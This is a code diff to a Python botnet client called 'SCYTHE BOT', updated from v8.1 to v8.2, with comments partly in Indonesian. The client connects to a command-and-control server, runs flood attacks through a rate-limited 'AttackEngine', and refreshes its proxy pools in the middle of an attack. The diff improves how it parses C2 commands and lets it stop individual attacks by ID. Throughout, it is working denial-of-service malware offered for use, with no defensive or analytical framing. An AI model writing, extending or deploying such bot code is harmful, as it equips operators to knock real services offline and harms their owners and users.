@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-SCYTHE BOT v8.1 — MAXIMIZED & FIXED
+SCYTHE BOT v8.2 — MAXIMIZED, FIXED & SYNCED WITH C2
 Features:
 - Auto-create directories before logging setup
 - Hybrid Rate Limiter (works with ANY RPS)
@@ -15,8 +15,10 @@ Features:
 - SOCKS5/HTTP/SOCKS4 support
 - MID-ATTACK PROXY REFRESH
 - PROXY POOL REFRESH every 3 minutes
-- FIXED: Auto-create logs/ directory
-- FIXED: Better error handling for missing deps
+- FIXED: Better command parsing from C2
+- FIXED: Support both {"cmd": "attack"} and {"type": "command", "cmd": "attack"}
+- FIXED: Stop specific attack by attack_id
+- FIXED: Better error handling and logging
 """
 
 import socket
@@ -122,8 +124,8 @@ config.read(os.path.join(SCRIPT_DIR, "config.ini"))
 C2_IP = config.get("C2", "IP", fallback="127.0.0.1")
 C2_PORT = config.getint("C2", "PORT", fallback=4884)
 BOT_ID = config.get("C2", "ID", fallback=socket.gethostname())
-RAW_THREADS = config.getint("C2", "THREADS", fallback=60)  # FIX: default 60 for 2GB VPS
-RPS_LIMIT = config.getint("C2", "RPS_LIMIT", fallback=800)  # FIX: default 800 for 2GB VPS
+RAW_THREADS = config.getint("C2", "THREADS", fallback=60)
+RPS_LIMIT = config.getint("C2", "RPS_LIMIT", fallback=800)
 BANDWIDTH_LIMIT_MB = config.getint("C2", "BANDWIDTH_LIMIT_MB", fallback=0)
 
 BOT_ID = BOT_ID.strip()
@@ -289,7 +291,7 @@ class HybridRateLimiter:
             sleep_time = (1.0 - self.tokens) / self.rate
             return sleep_time
 
-# ========== ATTACK ENGINE v8.1 (MAXIMIZED) ==========
+# ========== ATTACK ENGINE v8.2 (MAXIMIZED & FIXED) ==========
 class AttackEngine(threading.Thread):
     def __init__(self, attack_id, method, target, port, duration, hold_time, extra, rps_limit, proxies, sock):
         super().__init__(daemon=True)
@@ -635,13 +637,22 @@ class AttackEngine(threading.Thread):
     def stop(self):
         self.stop_flag.set()
 
-# ========== PARSER PERINTAH DARI C2 ==========
+# ========== PARSER PERINTAH DARI C2 (FIXED) ==========
 def handle_command(sock, cmd_json):
     global proxy_list
     try:
         data = json.loads(cmd_json)
+        
+        # FIXED: Support both formats: {"cmd": "attack"} and {"type": "command", "cmd": "attack"}
         cmd = data.get("cmd", "").lower()
-        log(f"📩 Received command: {cmd}")
+        msg_type = data.get("type", "").lower()
+        
+        # Debug: log semua command yang diterima
+        log(f"📩 RAW COMMAND: type={msg_type}, cmd={cmd}, keys={list(data.keys())}")
+        
+        if not cmd and msg_type:
+            # Kalau gak ada cmd tapi ada type, coba pakai type sebagai cmd
+            cmd = msg_type
 
         if cmd == "ping":
             send_report(sock, {"type": "pong", "id": BOT_ID, "time": time.time()})
@@ -745,16 +756,28 @@ def handle_command(sock, cmd_json):
                 log(f"⚠️ Cannot update RPS: attack {attack_id} not found or invalid RPS {new_rps}")
 
         elif cmd == "stop":
-            stop_event.set()
-            for attack_id, engine in list(current_attacks.items()):
-                try:
-                    engine.stop()
-                    engine.join(timeout=3)
-                except:
-                    pass
-            current_attacks.clear()
-            stop_event.clear()
-            send_report(sock, {"type": "all_stopped", "id": BOT_ID})
+            # FIXED: Support stop specific attack by attack_id
+            attack_id = data.get("attack_id")
+            if attack_id and attack_id in current_attacks:
+                log(f"🛑 Stopping specific attack: {attack_id}")
+                engine = current_attacks[attack_id]
+                engine.stop()
+                engine.join(timeout=5)
+                current_attacks.pop(attack_id, None)
+                send_report(sock, {"type": "attack_stopped", "id": BOT_ID, "attack_id": attack_id})
+            else:
+                # Stop all attacks (legacy behavior)
+                log("🛑 Stop all attacks command received")
+                stop_event.set()
+                for aid, engine in list(current_attacks.items()):
+                    try:
+                        engine.stop()
+                        engine.join(timeout=3)
+                    except:
+                        pass
+                current_attacks.clear()
+                stop_event.clear()
+                send_report(sock, {"type": "all_stopped", "id": BOT_ID})
 
         elif cmd == "proxy_update":
             new_proxies = data.get("proxies", [])
@@ -779,7 +802,7 @@ def handle_command(sock, cmd_json):
             sock.close()
             sys.exit(0)
         else:
-            log(f"Unknown command: {cmd}")
+            log(f"Unknown command: {cmd} | Data: {data}")
 
     except json.JSONDecodeError as e:
         log(f"Invalid JSON: {cmd_json[:200]} - {e}", logging.WARNING)
